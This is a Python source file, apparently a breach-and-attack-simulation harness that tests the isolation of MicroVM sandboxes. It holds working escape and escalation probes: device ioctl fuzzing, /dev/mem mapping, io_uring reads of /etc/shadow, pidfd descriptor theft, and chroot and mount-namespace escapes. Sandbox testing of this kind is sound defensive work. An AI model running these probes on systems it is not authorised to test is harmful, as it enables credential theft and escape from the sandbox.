#!/usr/bin/env python3
"""
MicroVM Breach & Attack Simulation (BAS) Harness
═════════════════════════════════════════════════

Production-grade dual-phase security boundary validation for
Cloud Hypervisor / Firecracker / KVM MicroVM sandboxes.

PHASE 1 — PRE-EXPLOIT : VirtIO engine fuzzing & TOCTOU race probes
PHASE 2 — POST-EXPLOIT: Advanced sandbox escape verification

Zero external dependencies. Uses raw syscalls via ctypes.

Author : ThinkDome Security Team
Target : Linux 5.10+ (aarch64/x86_64)
"""

from __future__ import annotations

import ctypes
import ctypes.util
import errno
import json
import os
import signal
import socket
import struct
import sys
import tempfile
import threading
import time
import traceback
from collections import OrderedDict
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple


# ═══════════════════════════════════════════════════════════════════════════════
#  CONSTANTS & LIBC BINDINGS
# ═══════════════════════════════════════════════════════════════════════════════

class Status(str, Enum):
    SECURE     = "SECURE"
    VULNERABLE = "VULNERABLE"
    INFO       = "INFO"
    ERROR      = "ERROR"
    SKIPPED    = "SKIPPED"


@dataclass
class TestResult:
    test_id: str
    phase: str
    name: str
    status: Status
    detail: str
    severity: str = "HIGH"
    mitre_id: str = ""
    evidence: List[str] = field(default_factory=list)


# ── libc bindings ────────────────────────────────────────────────────────────

_libc_name = ctypes.util.find_library("c")
if not _libc_name:
    _libc_name = "libc.so.6"
_libc = ctypes.CDLL(_libc_name, use_errno=True)

# Architecture-aware syscall numbers (x86_64 / aarch64)
_ARCH = os.uname().machine
if _ARCH in ("x86_64", "amd64"):
    _NR_IO_URING_SETUP    = 425
    _NR_IO_URING_ENTER    = 426
    _NR_IO_URING_REGISTER = 427
    _NR_PIDFD_OPEN        = 434
    _NR_PIDFD_GETFD       = 438
    _NR_LANDLOCK_CREATE_RULESET = 444
    _NR_LANDLOCK_ADD_RULE       = 445
    _NR_LANDLOCK_RESTRICT_SELF  = 446
    _NR_CLONE3             = 435
    _NR_MOUNT_SETATTR      = 442
    _NR_OPEN_TREE          = 428
    _NR_MOVE_MOUNT         = 429
    _NR_MEMFD_CREATE       = 319
    _NR_USERFAULTFD        = 323
    _NR_UNSHARE            = 272
elif _ARCH in ("aarch64", "arm64"):
    _NR_IO_URING_SETUP    = 425
    _NR_IO_URING_ENTER    = 426
    _NR_IO_URING_REGISTER = 427
    _NR_PIDFD_OPEN        = 434
    _NR_PIDFD_GETFD       = 438
    _NR_LANDLOCK_CREATE_RULESET = 444
    _NR_LANDLOCK_ADD_RULE       = 445
    _NR_LANDLOCK_RESTRICT_SELF  = 446
    _NR_CLONE3             = 435
    _NR_MOUNT_SETATTR      = 442
    _NR_OPEN_TREE          = 428
    _NR_MOVE_MOUNT         = 429
    _NR_MEMFD_CREATE       = 279
    _NR_USERFAULTFD        = 282
    _NR_UNSHARE            = 97
else:
    _NR_IO_URING_SETUP    = 425
    _NR_IO_URING_ENTER    = 426
    _NR_IO_URING_REGISTER = 427
    _NR_PIDFD_OPEN        = 434
    _NR_PIDFD_GETFD       = 438
    _NR_LANDLOCK_CREATE_RULESET = 444
    _NR_LANDLOCK_ADD_RULE       = 445
    _NR_LANDLOCK_RESTRICT_SELF  = 446
    _NR_CLONE3             = 435
    _NR_MOUNT_SETATTR      = 442
    _NR_OPEN_TREE          = 428
    _NR_MOVE_MOUNT         = 429
    _NR_MEMFD_CREATE       = 319
    _NR_USERFAULTFD        = 323
    _NR_UNSHARE            = 272

# Convenience syscall wrapper
_libc.syscall.restype = ctypes.c_long
_libc.syscall.argtypes = [ctypes.c_long]  # variadic


def _raw_syscall(nr: int, *args) -> int:
    """Issue a raw syscall and return the result (-errno on failure)."""
    result = _libc.syscall(ctypes.c_long(nr), *[ctypes.c_long(a) for a in args])
    if result < 0:
        return -ctypes.get_errno()
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  TEST HARNESS
# ═══════════════════════════════════════════════════════════════════════════════

class BASHarness:
    """Breach & Attack Simulation test harness."""

    def __init__(self) -> None:
        self.results: List[TestResult] = []
        self._test_counter = 0
        self._start_time = time.monotonic()

    def _next_id(self, phase: str) -> str:
        self._test_counter += 1
        return f"{phase}-{self._test_counter:03d}"

    def record(
        self,
        phase: str,
        name: str,
        status: Status,
        detail: str,
        severity: str = "HIGH",
        mitre_id: str = "",
        evidence: Optional[List[str]] = None,
    ) -> TestResult:
        r = TestResult(
            test_id=self._next_id(phase),
            phase=phase,
            name=name,
            status=status,
            detail=detail,
            severity=severity,
            mitre_id=mitre_id,
            evidence=evidence or [],
        )
        self.results.append(r)
        return r

    # ═══════════════════════════════════════════════════════════════════════
    #  PHASE 1 — PRE-EXPLOIT: VIRTIO ENGINE FUZZING
    # ═══════════════════════════════════════════════════════════════════════

    def phase1_virtio_device_toctou_race(self) -> None:
        """
        1.1  Multi-threaded I/O stressor targeting virtual block/KVM devices.

        Emulates an attacker triggering TOCTOU race conditions in the
        hypervisor's MMIO handler by rapidly opening/reading/writing
        device nodes from multiple threads simultaneously.

        MITRE: T1068 (Exploitation for Privilege Escalation)
        """
        DEVICE_TARGETS = [
            "/dev/kvm",
            "/dev/vda", "/dev/vdb",
            "/dev/vhost-net", "/dev/vhost-vsock",
            "/dev/net/tun",
            "/dev/loop-control",
        ]

        accessible_devices: List[str] = []
        blocked_devices: List[str] = []

        for dev in DEVICE_TARGETS:
            if os.path.exists(dev):
                if os.access(dev, os.R_OK) or os.access(dev, os.W_OK):
                    accessible_devices.append(dev)
                else:
                    blocked_devices.append(dev)
            else:
                blocked_devices.append(f"{dev} (absent)")

        if not accessible_devices:
            self.record(
                "PHASE1", "VirtIO Device TOCTOU Race",
                Status.SECURE,
                "No target virtual devices are accessible. "
                "Attack surface minimized.",
                mitre_id="T1068",
                evidence=[f"Blocked/absent: {blocked_devices}"],
            )
            return

        # ── Race condition stressor ──
        NUM_THREADS = 8
        OPS_PER_THREAD = 500
        FUZZ_DURATION_SEC = 3.0
        race_errors: List[str] = []
        race_successes: List[str] = []
        crash_detected = threading.Event()
        stop_event = threading.Event()

        def _fuzz_worker(dev_path: str, thread_id: int) -> None:
            """Rapidly open/read/write/ioctl a device to trigger races."""
            ops = 0
            deadline = time.monotonic() + FUZZ_DURATION_SEC
            while ops < OPS_PER_THREAD and time.monotonic() < deadline and not stop_event.is_set():
                try:
                    fd = os.open(dev_path, os.O_RDWR | os.O_NONBLOCK)
                    try:
                        try:
                            os.read(fd, 4096)
                        except (OSError, IOError):
                            pass
                        try:
                            os.write(fd, os.urandom(64))
                        except (OSError, IOError):
                            pass
                        try:
                            import fcntl
                            buf = ctypes.create_string_buffer(8)
                            fcntl.ioctl(fd, 0x8008af00, buf)
                            race_successes.append(
                                f"T{thread_id}: ioctl(VHOST_GET_FEATURES) on {dev_path} returned data"
                            )
                        except (OSError, IOError):
                            pass
                    finally:
                        os.close(fd)
                except PermissionError:
                    race_errors.append(f"T{thread_id}: PermissionError on {dev_path}")
                    break
                except OSError as e:
                    if e.errno == errno.EBUSY:
                        race_errors.append(f"T{thread_id}: EBUSY on {dev_path}")
                except Exception as e:
                    race_errors.append(f"T{thread_id}: {type(e).__name__}: {e}")
                    if "Segmentation" in str(e) or "core dumped" in str(e):
                        crash_detected.set()
                        stop_event.set()
                        break
                ops += 1

        threads: List[threading.Thread] = []
        for dev in accessible_devices:
            for tid in range(NUM_THREADS):
                t = threading.Thread(target=_fuzz_worker, args=(dev, tid), daemon=True)
                threads.append(t)

        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=FUZZ_DURATION_SEC + 2.0)

        if crash_detected.is_set():
            self.record(
                "PHASE1", "VirtIO Device TOCTOU Race",
                Status.VULNERABLE,
                "CRITICAL: Process crash detected during device I/O fuzzing! "
                "Possible memory corruption in MMIO handler.",
                severity="CRITICAL", mitre_id="T1068",
                evidence=race_errors[:10],
            )
        elif race_successes:
            self.record(
                "PHASE1", "VirtIO Device TOCTOU Race",
                Status.INFO,
                f"Devices accessible: {accessible_devices}. "
                f"{len(race_successes)} successful ioctl probes. "
                "No crash, but attack surface exists.",
                mitre_id="T1068",
                evidence=race_successes[:10] + race_errors[:5],
            )
        else:
            self.record(
                "PHASE1", "VirtIO Device TOCTOU Race",
                Status.SECURE,
                f"Devices accessible: {accessible_devices}. "
                f"Multi-threaded fuzz completed ({NUM_THREADS}x{OPS_PER_THREAD} ops) — "
                "no crash, no ioctl data leak.",
                mitre_id="T1068",
                evidence=race_errors[:5] if race_errors else ["Clean run"],
            )

    def phase1_kvm_ioctl_fuzzer(self) -> None:
        """
        1.2  KVM ioctl fuzzing — probe hypervisor control plane.
        MITRE: T1611 (Escape to Host)
        """
        KVM_CREATE_VM       = 0xAE01
        KVM_GET_API_VERSION = 0xAE00
        KVM_CREATE_VCPU     = 0xAE41
        KVM_RUN             = 0xAE80

        if not os.path.exists("/dev/kvm"):
            self.record("PHASE1", "KVM ioctl Fuzzing", Status.SECURE,
                        "/dev/kvm does not exist — nested KVM not exposed.",
                        mitre_id="T1611")
            return

        try:
            import fcntl
            kvm_fd = os.open("/dev/kvm", os.O_RDWR)
        except (PermissionError, OSError) as e:
            self.record("PHASE1", "KVM ioctl Fuzzing", Status.SECURE,
                        f"/dev/kvm access blocked: {e}",
                        mitre_id="T1611")
            return

        evidence = []
        vuln = False
        try:
            import fcntl
            try:
                ver = fcntl.ioctl(kvm_fd, KVM_GET_API_VERSION, 0)
                evidence.append(f"KVM_GET_API_VERSION = {ver}")
            except Exception as e:
                evidence.append(f"KVM_GET_API_VERSION blocked: {e}")
            try:
                vm_fd = fcntl.ioctl(kvm_fd, KVM_CREATE_VM, 0)
                evidence.append(f"KVM_CREATE_VM succeeded! vm_fd={vm_fd}")
                vuln = True
                try:
                    vcpu_fd = fcntl.ioctl(vm_fd, KVM_CREATE_VCPU, 0)
                    evidence.append(f"KVM_CREATE_VCPU succeeded! vcpu_fd={vcpu_fd}")
                    try:
                        fcntl.ioctl(vcpu_fd, KVM_RUN, 0)
                        evidence.append("KVM_RUN succeeded — CRITICAL")
                    except Exception as e:
                        evidence.append(f"KVM_RUN blocked: {e}")
                    os.close(vcpu_fd)
                except Exception as e:
                    evidence.append(f"KVM_CREATE_VCPU blocked: {e}")
                os.close(vm_fd)
            except Exception as e:
                evidence.append(f"KVM_CREATE_VM blocked: {e}")
        finally:
            os.close(kvm_fd)

        self.record("PHASE1", "KVM ioctl Fuzzing",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "KVM VM creation " + ("SUCCEEDED!" if vuln else "blocked."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1611", evidence=evidence)

    def phase1_mmio_timing_sidechannel(self) -> None:
        """
        1.3  MMIO Timing Side-Channel — physical memory mmap probes.
        MITRE: T1592.004 (Gather Victim Host Information)
        """
        import mmap as mmap_mod
        evidence = []
        vuln = False

        for dev_path, desc in [("/dev/mem", "Physical memory"),
                                ("/dev/kmem", "Kernel memory"),
                                ("/dev/port", "I/O port space")]:
            try:
                fd = os.open(dev_path, os.O_RDONLY | os.O_SYNC)
                try:
                    mm = mmap_mod.mmap(fd, 4096, mmap_mod.MAP_SHARED, mmap_mod.PROT_READ, offset=0)
                    first_bytes = mm[:16].hex()
                    mm.close()
                    evidence.append(f"CRITICAL: mmap({desc}) OK! Bytes: {first_bytes}")
                    vuln = True
                except (mmap_mod.error, OSError, PermissionError) as e:
                    evidence.append(f"{desc}: mmap blocked — {e}")
                finally:
                    os.close(fd)
            except PermissionError:
                evidence.append(f"{desc}: open denied")
            except FileNotFoundError:
                evidence.append(f"{desc}: absent")
            except OSError as e:
                evidence.append(f"{desc}: {e}")

        # Timing probe on /proc/timer_list
        timings = []
        for _ in range(200):
            t0 = time.perf_counter_ns()
            try:
                with open("/proc/timer_list", "r") as f:
                    f.read(64)
            except (PermissionError, OSError):
                pass
            timings.append(time.perf_counter_ns() - t0)

        if timings:
            avg = sum(timings) / len(timings)
            stddev = (sum((t - avg) ** 2 for t in timings) / len(timings)) ** 0.5
            evidence.append(f"Timer probe: min={min(timings)}ns avg={avg:.0f}ns "
                            f"max={max(timings)}ns stddev={stddev:.1f}ns ({len(timings)} samples)")

        self.record("PHASE1", "MMIO Timing Side-Channel",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "Physical memory mmap " + ("ACCESSIBLE!" if vuln else "blocked."),
                     severity="CRITICAL" if vuln else "MEDIUM",
                     mitre_id="T1592.004", evidence=evidence)

    def phase1_virtio_queue_overflow(self) -> None:
        """
        1.4  VirtIO descriptor table overflow via vhost ioctls.
        MITRE: T1203 (Exploitation for Client Execution)
        """
        VHOST_SET_OWNER     = 0x0000AF01
        VHOST_RESET_OWNER   = 0x0000AF02
        VHOST_SET_VRING_NUM = 0x4008AF10

        evidence = []
        vuln = False

        for dev in ["/dev/vhost-net", "/dev/vhost-vsock"]:
            if not os.path.exists(dev):
                evidence.append(f"{dev}: absent")
                continue
            try:
                fd = os.open(dev, os.O_RDWR | os.O_NONBLOCK)
            except (PermissionError, OSError) as e:
                evidence.append(f"{dev}: open blocked — {e}")
                continue

            try:
                import fcntl
                try:
                    fcntl.ioctl(fd, VHOST_SET_OWNER)
                    evidence.append(f"{dev}: VHOST_SET_OWNER succeeded!")
                    vuln = True
                    for vring_size in [0, 0xFFFF, 0x7FFFFFFF]:
                        try:
                            buf = struct.pack("II", 0, vring_size)
                            fcntl.ioctl(fd, VHOST_SET_VRING_NUM, buf)
                            evidence.append(f"{dev}: SET_VRING_NUM({vring_size:#x}) accepted!")
                        except (OSError, IOError) as e:
                            evidence.append(f"{dev}: SET_VRING_NUM({vring_size:#x}) rejected — {e}")
                    try:
                        fcntl.ioctl(fd, VHOST_RESET_OWNER)
                    except Exception:
                        pass
                except (OSError, IOError) as e:
                    evidence.append(f"{dev}: VHOST_SET_OWNER blocked — {e}")
            finally:
                os.close(fd)

        self.record("PHASE1", "VirtIO Queue Overflow Probe",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "vhost ownership " + ("ACQUIRED!" if vuln else "blocked or absent."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1203", evidence=evidence)

    # ═══════════════════════════════════════════════════════════════════════
    #  PHASE 2 — POST-EXPLOIT: ADVANCED SANDBOX ESCAPE PROBES
    # ═══════════════════════════════════════════════════════════════════════

    def phase2_io_uring_async_evasion(self) -> None:
        """
        2.1  io_uring Asynchronous Evasion Probe.

        Initializes an io_uring queue and submits async reads against
        sensitive host files. Tests if seccomp intercepts io_wqe
        kernel worker threads that execute on behalf of userspace.

        MITRE: T1059.004
        """
        IORING_SETUP_SQPOLL = 1 << 1
        IORING_OP_READ      = 22
        IORING_OFF_SQ_RING  = 0
        IORING_OFF_SQES     = 0x10000000
        evidence = []

        # io_uring_params struct: 120 bytes
        params_size = 120
        params = ctypes.create_string_buffer(params_size)

        # Try SQPOLL first — highest risk (kernel-side polling thread)
        struct.pack_into("I", params, 8, IORING_SETUP_SQPOLL)
        ring_fd = _raw_syscall(_NR_IO_URING_SETUP, 4, ctypes.addressof(params))

        sqpoll_blocked = False
        if ring_fd < 0:
            sqpoll_err = -ring_fd
            if sqpoll_err == errno.EPERM:
                evidence.append("io_uring_setup(SQPOLL): EPERM — seccomp blocked kernel polling (good)")
                sqpoll_blocked = True
            elif sqpoll_err == errno.ENOSYS:
                evidence.append("io_uring_setup: ENOSYS — syscall blocked by seccomp")
                self.record("PHASE2", "io_uring Async Evasion", Status.SECURE,
                            "io_uring_setup blocked by seccomp (ENOSYS).",
                            mitre_id="T1059.004", evidence=evidence)
                return
            else:
                evidence.append(f"io_uring_setup(SQPOLL): error {sqpoll_err} ({os.strerror(sqpoll_err)})")
                sqpoll_blocked = True

            # Retry normal mode
            params2 = ctypes.create_string_buffer(params_size)
            ring_fd = _raw_syscall(_NR_IO_URING_SETUP, 4, ctypes.addressof(params2))
            params = params2

        if ring_fd < 0:
            final_err = -ring_fd
            evidence.append(f"io_uring_setup(normal): error {final_err} ({os.strerror(final_err)})")
            self.record("PHASE2", "io_uring Async Evasion", Status.SECURE,
                        "io_uring_setup failed — seccomp coverage verified.",
                        mitre_id="T1059.004", evidence=evidence)
            return

        evidence.append(f"io_uring_setup succeeded: ring_fd={ring_fd}")
        vuln = False

        # Attempt async read of sensitive files
        sensitive_targets = ["/etc/shadow", "/proc/1/environ", "/proc/1/mem", "/etc/hostname"]

        for target_path in sensitive_targets:
            try:
                target_fd = os.open(target_path, os.O_RDONLY)
            except (PermissionError, FileNotFoundError, OSError) as e:
                evidence.append(f"open({target_path}): {type(e).__name__}")
                continue

            try:
                import mmap as mmap_mod
                read_buf = ctypes.create_string_buffer(4096)

                # Build SQE (64 bytes)
                sqe = ctypes.create_string_buffer(64)
                struct.pack_into("B", sqe, 0, IORING_OP_READ)
                struct.pack_into("i", sqe, 4, target_fd)
                struct.pack_into("Q", sqe, 8, 0)
                struct.pack_into("Q", sqe, 16, ctypes.addressof(read_buf))
                struct.pack_into("I", sqe, 24, 4096)

                try:
                    sq_ring_sz = struct.unpack_from("I", params, 72)[0] or 4096
                    sq_ring = mmap_mod.mmap(ring_fd, sq_ring_sz, mmap_mod.MAP_SHARED,
                                            mmap_mod.PROT_READ | mmap_mod.PROT_WRITE,
                                            offset=IORING_OFF_SQ_RING)

                    sqes_mmap = mmap_mod.mmap(ring_fd, 64 * 4, mmap_mod.MAP_SHARED,
                                              mmap_mod.PROT_READ | mmap_mod.PROT_WRITE,
                                              offset=IORING_OFF_SQES)

                    sqes_mmap[:64] = bytes(sqe)

                    sq_tail_off  = struct.unpack_from("I", params, 36)[0]
                    sq_array_off = struct.unpack_from("I", params, 56)[0]
                    sq_ring[sq_array_off:sq_array_off + 4] = struct.pack("I", 0)

                    cur_tail = struct.unpack_from("I", sq_ring, sq_tail_off)[0]
                    struct.pack_into("I", sq_ring, sq_tail_off, cur_tail + 1)

                    IORING_ENTER_GETEVENTS = 1
                    ret = _raw_syscall(_NR_IO_URING_ENTER, ring_fd, 1, 1, IORING_ENTER_GETEVENTS, 0, 0)

                    if ret >= 0:
                        time.sleep(0.05)
                        data = bytes(read_buf).rstrip(b"\x00")
                        if data:
                            evidence.append(f"io_uring async read({target_path}): GOT {len(data)} BYTES! "
                                            f"First 64: {data[:64]!r}")
                            vuln = True
                        else:
                            evidence.append(f"io_uring read({target_path}): submitted, no data returned")
                    else:
                        evidence.append(f"io_uring_enter: error {-ret} ({os.strerror(-ret)})")

                    sqes_mmap.close()
                    sq_ring.close()
                except (mmap_mod.error, OSError, ValueError) as e:
                    evidence.append(f"io_uring ring mmap: {e}")
            finally:
                os.close(target_fd)

        os.close(ring_fd)

        self.record("PHASE2", "io_uring Async Evasion",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "io_uring async file read " +
                     ("SUCCEEDED — seccomp does NOT block io_wqe threads!" if vuln
                      else "blocked. Seccomp io_uring coverage verified."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1059.004", evidence=evidence)

    def phase2_pidfd_descriptor_hijack(self) -> None:
        """
        2.2  pidfd Cross-Namespace Descriptor Hijack.

        pidfd_open(2) + pidfd_getfd(2) to steal file descriptors
        from host processes across PID namespace boundaries.

        MITRE: T1055 (Process Injection)
        """
        evidence = []
        vuln = False

        for target_pid in [1, 2, os.getppid()]:
            pidfd = _raw_syscall(_NR_PIDFD_OPEN, target_pid, 0)
            if pidfd < 0:
                err = -pidfd
                evidence.append(f"pidfd_open(pid={target_pid}): error {err} ({os.strerror(err)})")
                if err == errno.ENOSYS:
                    evidence.append("pidfd_open blocked by seccomp")
                elif err in (errno.ESRCH, errno.EINVAL):
                    evidence.append(f"PID {target_pid} not visible — namespace isolation working")
                continue

            evidence.append(f"pidfd_open(pid={target_pid}): SUCCESS — pidfd={pidfd}")

            for target_fd_num in [0, 1, 2, 3]:
                stolen_fd = _raw_syscall(_NR_PIDFD_GETFD, pidfd, target_fd_num, 0)
                if stolen_fd >= 0:
                    evidence.append(f"pidfd_getfd(pid={target_pid}, fd={target_fd_num}): "
                                    f"SUCCEEDED — stolen_fd={stolen_fd}")
                    vuln = True
                    try:
                        link = os.readlink(f"/proc/self/fd/{stolen_fd}")
                        evidence.append(f"  Stolen fd -> {link}")
                    except OSError:
                        pass
                    os.close(stolen_fd)
                else:
                    err = -stolen_fd
                    evidence.append(f"pidfd_getfd(pid={target_pid}, fd={target_fd_num}): "
                                    f"error {err} ({os.strerror(err)})")
            os.close(pidfd)

        # Yama ptrace scope
        try:
            yama = Path("/proc/sys/kernel/yama/ptrace_scope").read_text().strip()
            evidence.append(f"Yama ptrace_scope = {yama}")
            if yama == "0":
                evidence.append("WARNING: ptrace_scope=0 — unrestricted ptrace!")
        except (FileNotFoundError, PermissionError) as e:
            evidence.append(f"Yama: {e}")

        # /proc/<pid>/mem direct read
        for pid in [1, os.getppid()]:
            try:
                fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
                try:
                    data = os.pread(fd, 64, 0x400000)
                    if data:
                        evidence.append(f"CRITICAL: /proc/{pid}/mem read OK! ({len(data)} bytes)")
                        vuln = True
                except OSError as e:
                    evidence.append(f"/proc/{pid}/mem pread: {e}")
                finally:
                    os.close(fd)
            except (PermissionError, FileNotFoundError, OSError) as e:
                evidence.append(f"/proc/{pid}/mem open: blocked — {e}")

        self.record("PHASE2", "pidfd Descriptor Hijack",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "Cross-process fd duplication " +
                     ("SUCCEEDED — namespace isolation broken!" if vuln
                      else "blocked. PID namespace + Yama isolation verified."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1055", evidence=evidence)

    def phase2_chroot_fd_swap_escape(self) -> None:
        """
        2.3  chroot Jail Escape via FD Swap.

        Open handle to /, chroot into subdirectory, fchdir back out.
        Tests pivot_root vs chroot and mount namespace isolation.

        MITRE: T1611 (Escape to Host)
        """
        evidence = []
        vuln = False
        jail_dir = None

        try:
            jail_dir = tempfile.mkdtemp(prefix="bas_chroot_")
            os.makedirs(os.path.join(jail_dir, "nested"), exist_ok=True)

            try:
                root_fd = os.open("/", os.O_RDONLY | os.O_DIRECTORY)
            except OSError as e:
                evidence.append(f"Cannot open /: {e}")
                self.record("PHASE2", "chroot FD Swap Escape", Status.SECURE,
                            "Cannot open / — restriction active.",
                            mitre_id="T1611", evidence=evidence)
                return

            try:
                os.chroot(jail_dir)
                evidence.append(f"chroot({jail_dir}): SUCCEEDED")

                try:
                    os.fchdir(root_fd)
                    evidence.append("fchdir(root_fd): SUCCEEDED — pivoted outside chroot!")

                    for _ in range(64):
                        try:
                            os.chdir("..")
                        except OSError:
                            break

                    escaped_cwd = os.getcwd()
                    evidence.append(f"After escape: cwd = {escaped_cwd}")

                    try:
                        contents = os.listdir(".")
                        if "etc" in contents and "proc" in contents:
                            evidence.append(f"CRITICAL: Escaped to host root! Dirs: {sorted(contents)[:15]}")
                            vuln = True
                        else:
                            evidence.append(f"Escaped chroot, limited view: {sorted(contents)[:10]}")
                    except OSError as e:
                        evidence.append(f"listdir failed: {e}")
                except OSError as e:
                    evidence.append(f"fchdir(root_fd): blocked — {e}")

            except PermissionError:
                evidence.append("chroot(): EPERM — unprivileged (good)")
            except OSError as e:
                evidence.append(f"chroot(): {e}")

            os.close(root_fd)
        except Exception as e:
            evidence.append(f"Unexpected error: {e}")
        finally:
            if jail_dir:
                try:
                    import shutil
                    shutil.rmtree(jail_dir, ignore_errors=True)
                except Exception:
                    pass

        # /proc/1/root traversal
        try:
            host_root = os.readlink("/proc/1/root")
            evidence.append(f"/proc/1/root -> {host_root}")
            try:
                contents = os.listdir("/proc/1/root")
                evidence.append(f"/proc/1/root listdir: {sorted(contents)[:10]}")
                if "etc" in contents:
                    vuln = True
                    evidence.append("CRITICAL: Can traverse host root via /proc/1/root!")
            except (PermissionError, OSError) as e:
                evidence.append(f"/proc/1/root listdir blocked: {e}")
        except (PermissionError, FileNotFoundError, OSError) as e:
            evidence.append(f"/proc/1/root: {e}")

        # open_tree + move_mount (new mount API)
        OPEN_TREE_CLONE = 0x01
        path_buf = ctypes.create_string_buffer(b"/")
        ret = _raw_syscall(_NR_OPEN_TREE, -100, ctypes.addressof(path_buf), OPEN_TREE_CLONE)
        if ret >= 0:
            evidence.append(f"open_tree(/): succeeded — fd={ret}")
            target_buf = ctypes.create_string_buffer(b"/tmp/bas_mount_escape")
            try:
                os.makedirs("/tmp/bas_mount_escape", exist_ok=True)
            except Exception:
                pass
            mm_ret = _raw_syscall(_NR_MOVE_MOUNT, ret, 0, -100, ctypes.addressof(target_buf), 0)
            if mm_ret >= 0:
                evidence.append("move_mount SUCCEEDED — mount namespace escape!")
                vuln = True
            else:
                evidence.append(f"move_mount blocked: error {-mm_ret} ({os.strerror(-mm_ret)})")
            os.close(ret)
        else:
            evidence.append(f"open_tree(/): error {-ret} ({os.strerror(-ret)})")

        self.record("PHASE2", "chroot FD Swap Escape",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "Directory traversal / mount escape " +
                     ("SUCCEEDED!" if vuln else "blocked."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1611", evidence=evidence)

    def phase2_network_capability_escalation(self) -> None:
        """
        2.4  Network Capability Escalation Probe.

        Raw sockets, privileged ports, packet sockets, netlink,
        and network namespace manipulation.

        MITRE: T1557 (Adversary-in-the-Middle)
        """
        evidence = []
        vuln = False

        # Raw socket (ICMP)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            evidence.append("RAW socket (ICMP): CREATED — CAP_NET_RAW present!")
            vuln = True
            sock.close()
        except PermissionError:
            evidence.append("RAW socket (ICMP): EPERM — CAP_NET_RAW stripped (good)")
        except OSError as e:
            evidence.append(f"RAW socket (ICMP): {e}")

        # Raw socket (TCP)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            evidence.append("RAW socket (TCP): CREATED!")
            vuln = True
            sock.close()
        except PermissionError:
            evidence.append("RAW socket (TCP): EPERM (good)")
        except OSError as e:
            evidence.append(f"RAW socket (TCP): {e}")

        # Packet socket (L2 sniffing)
        try:
            ETH_P_ALL = 0x0003
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
            evidence.append("PACKET socket (L2): CREATED — full traffic capture!")
            vuln = True
            sock.close()
        except PermissionError:
            evidence.append("PACKET socket (L2): EPERM (good)")
        except OSError as e:
            evidence.append(f"PACKET socket (L2): {e}")

        # Privileged port binding
        for port in [22, 53, 80, 443]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
                evidence.append(f"Bind port {port}: SUCCEEDED!")
                vuln = True
                s.close()
            except PermissionError:
                evidence.append(f"Bind port {port}: EPERM (good)")
            except OSError as e:
                evidence.append(f"Bind port {port}: {e}")

        # Netlink sockets
        for nl_proto, nl_name in [(0, "ROUTE"), (12, "NETFILTER"), (15, "KOBJECT_UEVENT")]:
            try:
                sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, nl_proto)
                sock.bind((os.getpid(), 0))
                evidence.append(f"Netlink {nl_name}: BOUND")
                if nl_proto == 0:
                    try:
                        nlmsg = struct.pack("IHHII", 20, 18, 0x301, 1, os.getpid())
                        nlmsg += struct.pack("BxHII", 0, 0, 0, 0)
                        sock.sendto(nlmsg, (0, 0))
                        data = sock.recv(4096)
                        if data:
                            evidence.append(f"Netlink ROUTE query: {len(data)} bytes of interface data")
                    except Exception as e:
                        evidence.append(f"Netlink ROUTE query: {e}")
                sock.close()
            except PermissionError:
                evidence.append(f"Netlink {nl_name}: EPERM (good)")
            except OSError as e:
                evidence.append(f"Netlink {nl_name}: {e}")

        # Network namespace manipulation
        CLONE_NEWNET = 0x40000000
        ret = _raw_syscall(_NR_UNSHARE, CLONE_NEWNET)
        if ret == 0:
            evidence.append("unshare(CLONE_NEWNET): SUCCEEDED!")
            vuln = True
        else:
            evidence.append(f"unshare(CLONE_NEWNET): error {-ret} ({os.strerror(-ret)})")

        self.record("PHASE2", "Network Capability Escalation",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "Network capabilities " +
                     ("NOT fully stripped!" if vuln else "confirmed stripped."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1557", evidence=evidence)

    def phase2_userfaultfd_exploit_primitive(self) -> None:
        """
        2.5  userfaultfd Exploit Primitive Probe.

        userfaultfd enables controlled kernel page-fault pausing — a
        powerful TOCTOU exploit primitive used in real container/VM escapes.

        MITRE: T1068
        """
        evidence = []
        vuln = False

        try:
            uffd_policy = Path("/proc/sys/vm/unprivileged_userfaultfd").read_text().strip()
            evidence.append(f"unprivileged_userfaultfd = {uffd_policy}")
            if uffd_policy == "1":
                evidence.append("WARNING: Unprivileged userfaultfd enabled!")
        except (FileNotFoundError, PermissionError) as e:
            evidence.append(f"userfaultfd sysctl: {e}")

        UFFD_USER_MODE_ONLY = 1
        uffd = _raw_syscall(_NR_USERFAULTFD, UFFD_USER_MODE_ONLY)

        if uffd >= 0:
            evidence.append(f"userfaultfd(): SUCCEEDED — fd={uffd}")
            vuln = True
            try:
                import fcntl
                UFFDIO_API = 0xC018AA3F
                buf = bytearray(struct.pack("QQQ", 0xAA, 0, 0))
                try:
                    fcntl.ioctl(uffd, UFFDIO_API, buf)
                    api_ver, features, ioctls = struct.unpack("QQQ", buf)
                    evidence.append(f"UFFDIO_API: ver={api_ver:#x} features={features:#x} ioctls={ioctls:#x}")
                except (OSError, IOError) as e:
                    evidence.append(f"UFFDIO_API ioctl: {e}")
            except ImportError:
                pass
            os.close(uffd)
